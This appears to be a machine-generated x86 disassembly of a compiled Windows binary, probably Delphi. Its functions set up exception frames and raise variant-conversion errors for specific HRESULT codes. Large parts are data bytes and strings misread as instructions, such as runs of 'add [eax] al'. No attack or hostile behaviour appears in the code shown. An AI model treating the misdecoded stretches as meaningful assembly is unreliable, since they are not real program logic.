add [ esi + ecx * 2 ] dl
inc ecx
add ah al
push edx
inc ecx
add [ esi + ecx * 2 + 0x4ea00041 ] ch
inc ecx
add [ eax + 0x60004153 ] cl
pop ecx
inc ecx
add [ ecx + ebx * 2 + 0x41 ] ch
add [ eax + 0x59 ] cl
inc ecx
add [ ecx + ebx * 2 + 0x41 ] dl
add [ esi ] dl
push esp
dec ecx
outsb
jbe r-xdata
inc eax
jo r-xdata
imul esp [ ebp + 0x61 ] 0x62
insb
push esi
int3
jb r-xdata
outsd
popad
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi ] cl
inc eax
add [ eax + eax ] cl
add [ eax ] al
dec eax
jpo r-xdata
popad
jb r-xdata
push esi
test al 0xe6
inc eax
add [ eax ] al
add [ eax ] al
jb r-xdata
jns r-xdata
add [ eax ] al
add [ esp + esi + 0x40 ] bh
add [ eax - 0x73ffbfcc ] cl
xor al 0x40
add [ eax - 0x7bffbfcc ] dl
xor al 0x40
add ah cl
xor [ eax ] eax
call 0x2441273a
xor al [ eax ]
adc eax 0x72615645
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x19 ] dh
inc ebp
jb r-xdata
jo r-xdata
popad
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test al 0xe6
inc eax
add [ eax + eax ] cl
add [ eax ] al
dec eax
jpo r-xdata
nop
inc esp
out 0x40 al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x40 ] al
add [ eax + eax ] cl
add [ eax ] al
dec eax
jpo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dl
out 0x40 eax
add [ esp + esi + 0x40 ] bh
add [ eax - 0x73ffbfcc ] cl
xor al 0x40
add [ eax - 0x7bffbfcc ] dl
xor al 0x40
inc ecx
jb r-xdata
insb
outsd
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
outsd
jb r-xdata
popad
jae r-xdata
inc ebx
imul esp [ ecx + 0x6e ] 0x70795474
add [ esp + esi + 0x31cc0040 ] al
inc eax
add al ch
xor [ eax ] eax
and al 0x32
inc eax
add [ 0x72615645 ] dl
outsb
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ esp + esi + 0x40 ] bh
add [ eax - 0x73ffbfcc ] cl
xor al 0x40
add [ eax - 0x7bffbfcc ] dl
xor al 0x40
add ah cl
xor [ eax ] eax
call 0x244126d6
xor al [ eax ]
adc eax 0x72615645
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc0040e6 ] ch
add [ eax ] al
add [ eax + 0x7b ] cl
inc eax
add [ esp + esi + 0x40 ] bh
add [ eax - 0x73ffbfcc ] cl
xor al 0x40
add [ eax - 0x7bffbfcc ] dl
xor al 0x40
add ah cl
xor [ eax ] eax
call 0x24412672
xor al [ eax ]
push ss
inc ebp
push esi
popad
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bh
call r--data
add [ esp + esi + 0x40 ] bh
add [ eax - 0x73ffbfcc ] cl
xor al 0x40
add [ eax - 0x7bffbfcc ] dl
xor al 0x40
add ah cl
xor [ eax ] eax
call 0x24412802
xor al [ eax ]
pop ss
push esi
popad
jb r-xdata
popad
outsb
je r-xdata
outsd
jb r-xdata
inc ebp
jb r-xdata
add ah cl
jb r-xdata
inc eax
add [ eax + eax ] cl
add [ eax ] al
dec eax
jpo r-xdata
ror [ edi ] 0x40
add [ eax ] al
add [ eax ] al
jns r-xdata
jb r-xdata
insb
imul esp [ edi + ecx * 2 + 0x70 ] 0x6f727245
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + ebp * 8 + 0xc0040 ] bl
add [ esp + esi + 0x40 ] bh
add [ eax - 0x73ffbfcc ] cl
xor al 0x40
add [ eax - 0x7bffbfcc ] dl
xor al 0x40
add ah cl
xor [ eax ] eax
call 0x24412866
xor al [ eax ]
outsb
js r-xdata
dec ecx
popad
outsb
je r-xdata
adc eax 0x72615645
jns r-xdata
inc ebp
push esi
popad
jb r-xdata
add [ esp + esi + 0x31cc0040 ] al
inc eax
add al ch
xor [ eax ] eax
and al 0x32
inc eax
add [ edi ] dl
outsb
imul esp [ ecx + 0x6e ] 0x64614274
dec ecx
xor al 0x40
add [ esp + esi + 0x31cc0040 ] al
inc eax
add al ch
xor [ eax ] eax
and al 0x32
inc eax
add [ 0x72615645 ] dl
add [ eax ] al
dec eax
jpo r-xdata
call sub_40e832
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp al ch
inc eax
add [ eax + eax ] cl
outsd
jb r-xdata
add [ eax + eax ] cl
add [ eax ] al
dec eax
jpo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
aam 0xe7
inc eax
outsd
jb r-xdata
jo r-xdata
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ebp * 8 ] al
add [ esp + esi + 0x40 ] bh
add [ eax - 0x73ffbfcc ] cl
xor al 0x40
add [ eax - 0x7bffbfcc ] dl
xor al 0x40
add ah cl
xor [ eax ] eax
call 0x244128ca
xor al [ eax ]
sbb [ ebp + 0x56 ] al
popad
jb r-xdata
jb r-xdata
popad
add [ eax ] al
dec eax
jpo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebp
jb r-xdata
insb
imul esp [ ecx + eax * 2 + 0x72 ] 0x72724567
inc ebp
push esi
popad
jb r-xdata
xor al 0x40
add [ esp + esi + 0x31cc0040 ] al
inc eax
add al ch
xor [ eax ] eax
and al 0x32
inc eax
add [ edi ] dl
out 0x40 eax
add [ eax ] al
add [ eax ] al
popad
outsb
je r-xdata
shl [ eax - 0x19 ] 0x40
inc ebp
push esi
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
inc eax
add [ eax ] al
add [ esp + esi + 0x40 ] bh
outsb
je r-xdata
popad
outsb
je r-xdata
inc eax
add [ eax + eax ] cl
add [ eax ] al
dec eax
jpo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0xe9
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushfd
call r--data
imul esp [ ecx + 0x6e ] 0x65764f74
inc eax
add [ edx + esi ] ah
inc eax
add [ 0x72615645 ] dl
jbe r-xdata
popad
outsb
je r-xdata
add [ eax ] al
add [ esp + esi + 0x40 ] bh
outsb
je r-xdata
popad
add [ eax - 0x73ffbfcc ] cl
xor al 0x40
jb r-xdata
add [ eax - 0x73ffbfcc ] cl
xor al 0x40
add [ eax - 0x7bffbfcc ] dl
xor al 0x40
jb r-xdata
rcr [ eax + ebp * 8 + 0x40 ] 0x0
xor [ eax ] eax
call 0x2441279e
xor al [ eax ]
pop ss
jbe r-xdata
je r-xdata
popad
int3
outsd
inc eax
add al dl
jmp r-xdata
popad
jb r-xdata
popad
jns r-xdata
jb r-xdata
int3
dec bp
insd
outsd
jb r-xdata
inc eax
add ah cl
xor [ eax ] eax
call 0x244129fe
xor al [ eax ]
sbb [ ebp + 0x56 ] al
insd
popad
jb r-xdata
inc eax
add [ edx + esi ] ah
inc eax
add [ eax ] bl
inc ebp
push esi
add [ eax - 0x7bffbfcc ] dl
xor al 0x40
add ah cl
xor [ eax ] eax
call 0x2441299a
xor al [ eax ]
adc al 0x45
push esi
popad
jb r-xdata
inc eax
jb r-xdata
jb r-xdata
add ah cl
xor [ eax ] eax
call 0x24412932
xor al [ eax ]
sbb [ ebp + 0x56 ] al
popad
jb r-xdata
outsd
arpl [ ebx + 0x65 ] bp
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + ebp * 8 + 0xc0040 ] bl
add [ eax ] al
dec eax
jpo r-xdata
inc ebp
jb r-xdata
outsb
je r-xdata
popad
outsb
je r-xdata
jb r-xdata
inc ebp
jo r-xdata
popad
je r-xdata
inc eax
add [ ecx + ebp * 8 + 0x40 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ebp * 8 + 0x40 ] ch
add [ eax + eax ] cl
add [ eax ] al
dec eax
jpo r-xdata
outsd
jb r-xdata
push ebp
push sub_40eafe
push [ fs : eax ]
add [ esp + esi + 0x40 ] bh
add [ eax - 0x73ffbfcc ] cl
xor al 0x40
add [ eax - 0x7bffbfcc ] dl
xor al 0x40
add ah cl
xor [ eax ] eax
call 0x24412aca
xor al [ eax ]
adc eax 0x72615645
add [ eax ] al
add [ eax ] al
outsd
imul esp [ ecx + 0x6e ] 0x73694474
jo r-xdata
add [ edx + esi ] ah
inc eax
add [ 0x72615645 ] dl
outsb
js r-xdata
xor al 0x40
add ah cl
xor [ eax ] eax
call 0x24412a66
xor al [ eax ]
pop ss
inc ebp
push esi
popad
jb r-xdata
jne r-xdata
je r-xdata
inc eax
add [ eax ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bh
0xc0040 0x0
outsd
jb r-xdata
jb r-xdata
inc ebp
jb r-xdata
inc eax
add [ ecx + ebp * 8 ] al
inc eax
add esp 0xffffffe4
push ebx
je r-xdata
in al dx
arpl [ gs : ebp + 0x64 ] si
inc ebp
jb r-xdata
jae r-xdata
popad
pushfd
dec edi
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dl
jmp r--data
outsd
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov esi edx
mov ebx eax
push 0x6f727245
jb r-xdata
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405efc
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9c8
call sub_4039c0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40eb05
lea eax [ ebp - 0x4 ]
call sub_404008
retn
add [ edi + edi * 8 + 0x30 ] ah
outsd
jb r-xdata
xor eax eax
push ebp
push sub_40eb97
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_413dc4
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_413dc4
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405efc
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba04
call sub_4039c0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40eb9e
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_40402c
retn
dec ebp
in al 0x8b
mov ebx eax
popad
jns r-xdata
push 0x0
xor eax eax
rcl [ ebp - 0x75 ] 0xec
0x40 0x0
0x40 0x0
sub_40e832
inc eax
add [ edx + esi ] ah
add ah cl
xor [ eax ] eax
call 0x244128ca
xor al [ eax ]
sbb [ ebp + 0x56 ] al
popad
jb r-xdata
jb r-xdata
outsb
je r-xdata
popad
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0xe9
outsd
jb r-xdata
add [ eax - 0x73ffbfcc ] cl
xor al 0x40
jb r-xdata
add [ eax - 0x73ffbfcc ] cl
xor al 0x40
add [ eax - 0x7bffbfcc ] dl
xor al 0x40
jb r-xdata
add [ eax ] al
add [ esp + esi + 0x40 ] bh
popad
outsb
je r-xdata
rcr [ eax + ebp * 8 + 0x40 ] 0x0
je r-xdata
popad
inc eax
add al dl
jmp r-xdata
popad
outsb
je r-xdata
popad
jb r-xdata
popad
jns r-xdata
add [ eax ] al
add [ esp + esi + 0x40 ] bh
popad
push esi
popad
jb r-xdata
inc eax
add [ eax + eax ] cl
add [ eax ] al
dec eax
jpo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ebp * 8 ] al
add [ esp + esi + 0x40 ] bh
add [ eax - 0x73ffbfcc ] cl
xor al 0x40
add [ eax - 0x7bffbfcc ] dl
xor al 0x40
int3
dec bp
insd
outsd
jb r-xdata
int3
outsd
inc eax
add [ edx + esi ] ah
inc eax
add [ eax ] bl
inc ebp
push esi
add [ eax - 0x7bffbfcc ] dl
xor al 0x40
add ah cl
xor [ eax ] eax
call 0x2441299a
xor al [ eax ]
adc al 0x45
push esi
popad
jb r-xdata
inc eax
jb r-xdata
jb r-xdata
add ah cl
xor [ eax ] eax
call 0x24412932
xor al [ eax ]
sbb [ ebp + 0x56 ] al
popad
jb r-xdata
outsd
arpl [ ebx + 0x65 ] bp
inc ebp
jb r-xdata
imul esp [ ecx + 0x6e ] 0x64614274
dec ecx
adc eax 0x72615645
jns r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + ebp * 8 + 0xc0040 ] bl
add [ eax ] al
dec eax
jpo r-xdata
inc ebp
jb r-xdata
popad
jb r-xdata
inc eax
add ah cl
xor [ eax ] eax
call 0x244129fe
xor al [ eax ]
sbb [ ebp + 0x56 ] al
insd
outsb
je r-xdata
popad
outsb
je r-xdata
jo r-xdata
popad
je r-xdata
inc eax
add [ ecx + ebp * 8 + 0x40 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ebp * 8 + 0x40 ] ch
add [ eax + eax ] cl
add [ eax ] al
dec eax
jpo r-xdata
outsd
jb r-xdata
add [ eax ] al
dec eax
jpo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebp
jb r-xdata
push ebp
push sub_40eafe
push [ fs : eax ]
add [ esp + esi + 0x40 ] bh
add [ eax - 0x73ffbfcc ] cl
xor al 0x40
add [ eax - 0x7bffbfcc ] dl
xor al 0x40
add ah cl
xor [ eax ] eax
call 0x24412aca
xor al [ eax ]
adc eax 0x72615645
add [ eax ] al
add [ eax ] al
outsd
jb r-xdata
inc ebp
imul esp [ ecx + 0x6e ] 0x73694474
jo r-xdata
add [ edx + esi ] ah
inc eax
add [ 0x72615645 ] dl
outsb
js r-xdata
xor al 0x40
add ah cl
xor [ eax ] eax
call 0x24412a66
xor al [ eax ]
pop ss
inc ebp
push esi
popad
jb r-xdata
jne r-xdata
jb r-xdata
inc ebp
jb r-xdata
outsb
js r-xdata
dec ecx
inc eax
add [ ecx + ebp * 8 ] al
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushfd
call r--data
outsd
jb r-xdata
add esp 0xffffffe4
push ebx
je r-xdata
je r-xdata
inc eax
add [ eax ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bh
0xc0040 0x0
outsd
jb r-xdata
in al dx
arpl [ gs : ebp + 0x64 ] si
inc ebp
jb r-xdata
jae r-xdata
popad
pushfd
dec edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dl
jmp r--data
outsd
inc eax
add [ 0x72615645 ] dl
xor al 0x40
add [ esp + esi + 0x31cc0040 ] al
inc eax
add al ch
xor [ eax ] eax
and al 0x32
call sub_40e832
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp al ch
inc eax
add [ eax + eax ] cl
add [ eax ] al
dec eax
jpo r-xdata
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov esi edx
mov ebx eax
push 0x6f727245
jb r-xdata
jb r-xdata
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405efc
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9c8
call sub_4039c0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40eb05
lea eax [ ebp - 0x4 ]
call sub_404008
retn
add [ edi + edi * 8 + 0x30 ] ah
outsd
jb r-xdata
xor eax eax
push ebp
push sub_40eb97
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_413dc4
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_413dc4
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405efc
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba04
call sub_4039c0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40eb9e
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_40402c
retn
dec ebp
in al 0x8b
mov ebx eax
popad
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + ebp * 8 + 0xc0040 ] bl
add [ esp + esi + 0x40 ] bh
add [ eax - 0x73ffbfcc ] cl
xor al 0x40
add [ eax - 0x7bffbfcc ] dl
xor al 0x40
add ah cl
xor [ eax ] eax
call 0x24412866
xor al [ eax ]
push 0x0
xor eax eax
rcl [ ebp - 0x75 ] 0xec
jns r-xdata
0x40 0x0
0x40 0x0
sub_40eab4
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40eafe
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405efc
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9c8
call sub_4039c0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40eb05
lea eax [ ebp - 0x4 ]
call sub_404008
retn
sub_40eb08
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40eb97
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_413dc4
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_413dc4
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405efc
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba04
call sub_4039c0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40eb9e
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_40402c
retn
sub_40eba4
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40ebee
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405efc
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9c8
call sub_4039c0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ebf5
lea eax [ ebp - 0x4 ]
call sub_404008
retn
sub_40ebf8
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40ec87
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_413dc4
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_413dc4
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405efc
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba04
call sub_4039c0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ec8e
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_40402c
retn
sub_40ec94
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40ecde
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405efc
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9c8
call sub_4039c0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ece5
lea eax [ ebp - 0x4 ]
call sub_404008
retn
sub_40ece8
push ebp
mov ebp esp
mov ecx 0x8
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40ef2d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
cmp eax 0x8002000a
jg r-xdata
sub eax 0x8002000b
je r-xdata
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405efc
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9c8
call sub_4039c0
jmp r-xdata
sub eax 0x2
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405efc
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9c8
call sub_4039c0
jmp r-xdata
cmp eax 0x80020005
jg r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ef34
lea eax [ ebp - 0x40 ]
mov edx 0x2
call sub_40402c
lea eax [ ebp - 0x20 ]
mov edx 0x8
call sub_40402c
retn
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405efc
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9c8
call sub_4039c0
jmp r-xdata
sub eax 0x50001
je r-xdata
sub eax 0x80020008
je r-xdata
je r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_405efc
mov ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9c8
call sub_4039c0
jmp r-xdata
sub eax 0x49
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405efc
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9c8
call sub_4039c0
jmp r-xdata
dec eax
je r-xdata
call sub_40eab4
jmp r-xdata
sub eax 0x80004001
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405efc
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9c8
call sub_4039c0
jmp r-xdata
jmp r-xdata
call sub_40eba4
jmp r-xdata
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_405efc
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9c8
call sub_4039c0
jmp r-xdata
sub eax 0xbffe
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] 0xb
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x2c ] 0x0
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_40b1b4
mov eax [ ebp - 0x3c ]
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] 0xb
lea eax [ ebp - 0x38 ]
push eax
push 0x2
lea edx [ ebp - 0x40 ]
mov eax [ rw-data ]
call sub_405efc
mov ecx [ ebp - 0x40 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba04
call sub_4039c0
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405efc
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9c8
call sub_4039c0
jmp r-xdata
jmp r-xdata
sub_40ef48
push ebx
test eax eax
je r-xdata
pop ebx
retn
mov ebx eax
sub ebx 0x80020005
je r-xdata
mov eax edx
mov edx ecx
call sub_40eb08
jmp r-xdata
sub ebx 0x5
je r-xdata
mov eax edx
mov edx ecx
call sub_40ebf8
jmp r-xdata
jmp r-xdata
call sub_40ece8
sub_40ef7c
push ebx
push esi
mov esi edx
mov ebx eax
call sub_40282c
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
call sub_40282c
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
mov ecx esi
mov edx ebx
mov eax 0x8002000a
call sub_40ef48
pop esi
pop ebx
retn
call sub_40282c
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
mov ecx esi
mov edx ebx
mov eax 0x8002000a
call sub_40ef48
jmp r-xdata
call sub_40286c
mov edx eax
mov eax edx
call sub_4039c0
mov ecx esi
mov edx ebx
mov eax 0x80020005
call sub_40ef48
jmp r-xdata
pop esi
pop ebx
retn
sub_40f000
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40f04a
